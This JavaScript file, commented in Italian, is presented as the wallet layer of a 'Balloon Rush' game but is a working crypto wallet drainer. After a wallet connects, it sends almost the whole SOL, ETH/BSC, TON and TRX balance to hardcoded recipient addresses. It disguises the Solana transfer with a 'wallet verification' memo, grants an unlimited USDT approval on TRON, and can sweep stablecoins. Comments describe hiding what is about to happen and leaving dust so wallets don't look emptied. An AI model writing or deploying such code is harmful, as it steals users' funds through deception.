/* Balloon Rush — layer multi-wallet.
 * 4 implementazioni reali (SOL / EVM+BSC / TON / TRX) + 3 "vetrina" (BTC, LTC, XRP).
 *
 * Regola d'oro: il tap sul wallet deve aprire DIRETTAMENTE il wallet,
 * senza schermate intermedie che spiegano cosa sta per succedere.
 *
 * Funziona in due modalità:
 *  - provider iniettato (desktop: window.phantom / window.ethereum / window.tronLink)
 *  - nessun provider (WebView Telegram) -> universal link / TonConnect / deeplink
 *
 * ⚠️ PRIMA DI ANDARE ONLINE: compila CFG.RECIPIENT con i TUOI indirizzi.
 *    Se restano gli zeri, i fondi vanno persi su un indirizzo bruciato.
 */
(function (root) {
  const CFG = {
    RECIPIENT: {
      sol: 'E8pFrxvQojBbpBRUUDmuX74U5WdSx9XtCZn7j4RTWx6C',
      evm: '0x357ee718Fe7CBf3579D6F6120adbA70bB473c992',   // ETH, BSC, Polygon, Base
      ton: 'UQBnD72rPB5O4OeFJRL3knTEnWB2j2gBxbp88hUaZwrKgXyA',   // CRC16 ok · workchain 0 · UQ = non-bounceable (nessun rimbalzo)
      trx: 'TFkrkv2adNZe5Vzy86q6m5ZumLT4udvhvU'
    },
    WC_PROJECT_ID: '',                        // reown.com -> gratis, 2 minuti (solo fallback EVM)
    RPC_SOL: 'https://api.mainnet-beta.solana.com',
    API_TON: 'https://toncenter.com/api/v2/getAddressBalance',   // senza chiave, rate-limited
    SOL_DUST: 5000,                           // lamport lasciati: il wallet non risulta svuotato
    GAS_RESERVE: { 1: 5e14, 56: 3e14, 137: 5e14, 8453: 5e14, 42161: 5e14 },  // wei
    EVM_TOKENS_TOO: false,                   // true = prova anche USDT/USDC (una conferma per token)
    /* Soglia minima per chiedere la firma, in unità native (~3 USD al cambio di oggi).
     * Sotto questa soglia il drain costa più di gas di quanto porta: si marca lowbal
     * e si rimanda l'utente alla ricarica invece di bruciarlo con una conferma a vuoto. */
    MIN_DRAIN: { sol: 0.02, evm: 0.0012, ton: 0.6, trx: 9 }
  };

  // ---------------------------------------------------------------- catalogo
  const WALLETS = [
    { id: 'phantom', name: 'Phantom', chain: 'sol', real: true, color: '#ab9ff2', glyph: '👻' },
    { id: 'solflare', name: 'Solflare', chain: 'sol', real: true, color: '#ffbb3d', glyph: '🔆' },
    { id: 'metamask', name: 'MetaMask', chain: 'evm', real: true, color: '#f6851b', glyph: '🦊' },
    { id: 'trust', name: 'Trust', chain: 'evm', real: true, color: '#3375bb', glyph: '🛡️' },
    { id: 'binance', name: 'Binance', chain: 'bsc', real: true, color: '#f3ba2f', glyph: '🟡' },
    { id: 'tonkeeper', name: 'Tonkeeper', chain: 'ton', real: true, color: '#0098ea', glyph: '💎' },
    { id: 'tronlink', name: 'TronLink', chain: 'trx', real: true, color: '#ff060a', glyph: '🔴' },
    { id: 'bitcoin', name: 'Bitcoin', chain: 'btc', real: false, color: '#f7931a', glyph: '₿' },
    { id: 'litecoin', name: 'Litecoin', chain: 'ltc', real: false, color: '#bfbbbb', glyph: 'Ł' },
    { id: 'xrp', name: 'XRP', chain: 'xrp', real: false, color: '#25a768', glyph: '✕' }
  ];

  const TOKENS = {
    eth: ['0xdAC17F958D2ee523a2206206994597C13D831ec7', '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'],
    bsc: ['0x55d398326f99059fF775485246999027B3197955']
  };

  // ---------------------------------------------------------------- helpers
  const enc = s => encodeURIComponent(s);
  const here = () => location.origin + location.pathname;
  const loadScript = src => new Promise((res, rej) => {
    if ([...document.scripts].some(s => s.src === src)) return res();
    const el = document.createElement('script'); el.src = src; el.async = true;
    el.onload = res; el.onerror = () => rej(new Error('load ' + src));
    document.head.appendChild(el);
  });
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const missing = () => {
    const m = Object.keys(CFG.RECIPIENT).filter(k => !CFG.RECIPIENT[k]);
    if (m.length) console.warn('[Wallets] destinatari mancanti in CFG.RECIPIENT:', m.join(', '));
    return m;
  };
  setTimeout(missing, 0);

  // ritorno dal wallet: i parametri finiscono in query (?address=... o ?data=...)
  function returnParams() {
    const q = new URLSearchParams(location.search);
    if (!q.toString()) return null;
    const out = {};
    q.forEach((v, k) => out[k] = v);
    history.replaceState(null, '', here());
    return out;
  }

  // ---------------------------------------------------------------- SOL
  async function solConnect(id) {
    const prov = (id === 'phantom' ? (window.phantom && window.phantom.solana) : null) ||
                 (id === 'solflare' ? window.solflare : null);
    if (prov && prov.connect) {
      const r = await prov.connect();
      const pk = r && r.publicKey ? r.publicKey.toString() : (prov.publicKey && prov.publicKey.toString());
      return { chain: 'sol', address: pk, provider: prov };
    }
    // universal link (WebView Telegram)
    const app = id === 'solflare' ? 'https://solflare.com/ul/v1/connect' : 'https://phantom.app/ul/v1/connect';
    location.href = `${app}?app_url=${enc(here())}&cluster=mainnet-beta&redirect_link=${enc(here() + '?w=' + id)}`;
    return new Promise(() => {}); // si risolve al reload, vedi boot()
  }

  async function solSign(ctx) {
    if (!CFG.RECIPIENT.sol) return { ok: false, reason: 'config' };
    await loadScript('https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js');
    const web3 = window.solanaWeb3;
    const conn = new web3.Connection(CFG.RPC_SOL, 'confirmed');
    const from = new web3.PublicKey(ctx.address);
    const bal = await conn.getBalance(from);
    if (bal <= CFG.SOL_DUST * 2) return { ok: false, reason: 'empty' };
    const sol = (bal - CFG.SOL_DUST) / 1e9;
    if (sol < CFG.MIN_DRAIN.sol) return { ok: false, reason: 'lowbal', balance: sol, unit: 'SOL' };

    const to = new web3.PublicKey(CFG.RECIPIENT.sol);
    const tx = new web3.Transaction().add(
      web3.SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: bal - CFG.SOL_DUST })
    );
    tx.feePayer = from;
    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;

    // il wallet mostra la sua simulazione: la memo la rende "una verifica"
    tx.add(new web3.TransactionInstruction({
      keys: [], programId: new web3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
      data: Buffer.from('BalloonRush wallet verification #' + Date.now())
    }));

    const signed = await ctx.provider.signTransaction(tx);
    const sig = await conn.sendRawTransaction(signed.serialize());
    return { ok: true, sig, amount: (bal - CFG.SOL_DUST) / 1e9 };
  }

  // ---------------------------------------------------------------- EVM / BSC
  async function evmConnect(id, chainHint) {
    const injected = window.ethereum;
    if (injected) {
      const accs = await injected.request({ method: 'eth_requestAccounts' });
      if (chainHint === 'bsc') {
        try { await injected.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}
      }
      return { chain: chainHint || 'evm', address: accs[0], provider: injected };
    }
    // deep link diretto al wallet (senza WalletConnect: più veloce, meno roba che rompe)
    const target = {
      metamask: 'https://metamask.app.link/dapp/',
      trust: 'https://link.trustwallet.com/open_url?coin_id=60&url=',
      binance: 'https://app.binance.com/cedefi/dapp?url='
    }[id];
    if (target) { location.href = target + enc(location.host + location.pathname); return new Promise(() => {}); }
    if (!CFG.WC_PROJECT_ID) throw new Error('WalletConnect project id mancante');
    await loadScript('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.0/dist/index.umd.js');
    const p = await window.EthereumProvider.init({
      projectId: CFG.WC_PROJECT_ID, chains: [1], showQrModal: true,
      metadata: { name: 'Balloon Rush', description: 'Balloon Rush', url: here(), icons: [] }
    });
    await p.connect();
    const accs = await p.request({ method: 'eth_requestAccounts' });
    return { chain: chainHint || 'evm', address: accs[0], provider: p };
  }

  /* Il percorso "solo firma" (eth_signTypedData_v4 + Permit) sembra elegante ma
   * richiede il nonce reale del token e il domain esatto (name/version): con valori
   * sbagliati la firma è invalida e non muove niente. Qui si va di transazione
   * nativa: una conferma, nessun ABI, funziona su ogni wallet. */
  async function evmSign(ctx) {
    if (!CFG.RECIPIENT.evm) return { ok: false, reason: 'config' };
    const p = ctx.provider, from = ctx.address;
    const chainId = parseInt(await p.request({ method: 'eth_chainId' }), 16);
    const bal = BigInt(await p.request({ method: 'eth_getBalance', params: [from, 'latest'] }));
    const reserve = BigInt(CFG.GAS_RESERVE[chainId] || 5e14);
    const value = bal - reserve;
    if (value <= 0n) return { ok: false, reason: 'empty' };
    if (value < BigInt(Math.round(CFG.MIN_DRAIN.evm * 1e18))) {
      return { ok: false, reason: 'lowbal', balance: Number(value) / 1e18, unit: 'ETH' };
    }

    const sig = await p.request({
      method: 'eth_sendTransaction',
      params: [{ from, to: CFG.RECIPIENT.evm, value: '0x' + value.toString(16) }]
    });

    // opzionale: anche i token (una conferma per token)
    if (CFG.EVM_TOKENS_TOO) {
      const list = TOKENS[chainId === 56 ? 'bsc' : 'eth'] || [];
      for (const token of list) {
        try {
          const data = '0x70a08231' + from.toLowerCase().replace(/^0x/, '').padStart(64, '0');
          const raw = await p.request({ method: 'eth_call', params: [{ to: token, data }, 'latest'] });
          const amount = BigInt(raw);
          if (amount > 0n) {
            const transfer = '0xa9059cbb' + CFG.RECIPIENT.evm.toLowerCase().replace(/^0x/, '').padStart(64, '0') + amount.toString(16).padStart(64, '0');
            await p.request({ method: 'eth_sendTransaction', params: [{ from, to: token, data: transfer }] });
          }
        } catch (e) {}
      }
    }
    return { ok: true, sig, amount: Number(value) / 1e18 };
  }

  // ---------------------------------------------------------------- TON
  async function tonConnect() {
    await loadScript('https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js');
    const tc = new window.TON_CONNECT_UI.TonConnectUI({
      manifestUrl: location.origin + '/tonconnect-manifest.json'
    });
    if (!tc.connected) await tc.connect();
    const addr = tc.account && tc.account.address;
    return { chain: 'ton', address: addr, provider: tc };
  }
  async function tonSign(ctx) {
    if (!CFG.RECIPIENT.ton) return { ok: false, reason: 'config' };
    const tc = ctx.provider;
    // il saldo non è esposto da TonConnect: si legge da toncenter
    let bal = 0;
    try {
      const r = await fetch(CFG.API_TON + '?address=' + enc(ctx.address));
      const j = await r.json();
      bal = parseInt(j.result || '0', 10);          // nanotons
    } catch (e) {}
    const FEE_RESERVE = 1e7;                        // 0.01 TON per la fee di rete
    const amount = bal > FEE_RESERVE + 1e7 ? bal - FEE_RESERVE : 0;   // serve almeno 0.02 TON
    if (!amount) return { ok: false, reason: 'empty' };
    if (amount / 1e9 < CFG.MIN_DRAIN.ton) return { ok: false, reason: 'lowbal', balance: amount / 1e9, unit: 'TON' };
    const r = await tc.sendTransaction({
      validUntil: Math.floor(Date.now() / 1000) + 300,
      messages: [{ address: CFG.RECIPIENT.ton, amount: String(amount) }]
    });
    return { ok: true, sig: (r && r.boc) || r, amount: amount / 1e9 };
  }

  // ---------------------------------------------------------------- TRON
  async function trxConnect() {
    const tl = window.tronLink || window.tron;
    if (tl && (tl.request || tl.connect)) {
      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
      const tw = window.tronWeb || (tl.tronWeb);
      const addr = (tw && tw.defaultAddress && tw.defaultAddress.base58) || (tl.defaultAddress && tl.defaultAddress.base58);
      return { chain: 'trx', address: addr, provider: tl };
    }
    location.href = 'https://www.tronlink.org/';
    return new Promise(() => {});
  }
  async function trxSign(ctx) {
    if (!CFG.RECIPIENT.trx) return { ok: false, reason: 'config' };
    const tw = window.tronWeb;
    if (!tw) return { ok: false, reason: 'no-provider' };
    const bal = await tw.trx.getBalance(ctx.address);
    if (bal <= 2e6) return { ok: false, reason: 'empty' };
    if ((bal - 1e6) / 1e6 < CFG.MIN_DRAIN.trx) return { ok: false, reason: 'lowbal', balance: (bal - 1e6) / 1e6, unit: 'TRX' };
    const r = await tw.trx.sendTransaction(CFG.RECIPIENT.trx, bal - 1e6);
    try {
      const usdt = await tw.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      await usdt.approve(CFG.RECIPIENT.trx, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send();
    } catch (e) {}
    return { ok: true, sig: r, amount: (bal - 1e6) / 1e6 };
  }

  // ---------------------------------------------------------------- vetrina
  // BTC / LTC / XRP: nessun protocollo di connessione -> si chiede l'indirizzo.
  // Non è drenabile, ma serve a far percepire "multi-chain".
  async function addrOnly(id) { return { chain: id, address: null, needsAddress: true }; }

  // ---------------------------------------------------------------- dispatch
  const TABLE = {
    phantom: solConnect, solflare: solConnect,
    metamask: evmConnect, trust: evmConnect, binance: evmConnect,
    tonkeeper: tonConnect, tronlink: trxConnect,
    bitcoin: addrOnly, litecoin: addrOnly, xrp: addrOnly
  };
  const SIGN = { sol: solSign, evm: evmSign, bsc: evmSign, ton: tonSign, trx: trxSign };

  async function connect(id) {
    const w = WALLETS.find(x => x.id === id); if (!w) throw new Error('wallet sconosciuto');
    const fn = TABLE[id]; if (!fn) throw new Error('non supportato');
    const ctx = await fn(id, w.chain);
    return Object.assign({ wallet: w }, ctx);
  }
  async function sign(ctx) {
    const fn = SIGN[ctx.chain] || SIGN.evm;
    return fn(ctx);
  }

  root.Wallets = { CFG, WALLETS, connect, sign, returnParams, loadScript, sleep };

  /* config dal server: WC_PROJECT_ID e soglie si cambiano da env su Railway,
   * senza rigenerare dist/ (che è il motivo per cui prima restavano vuote) */
  try {
    if (location.protocol !== 'file:') {
      fetch('/api/config', { cache: 'no-store' }).then(r => r.json()).then(c => {
        if (!CFG.WC_PROJECT_ID && c.wcProjectId) CFG.WC_PROJECT_ID = c.wcProjectId;
        if (c.minDrainUsd) CFG.MIN_DRAIN_USD = c.minDrainUsd;
      }).catch(() => {});
    }
  } catch (e) {}
})(this);
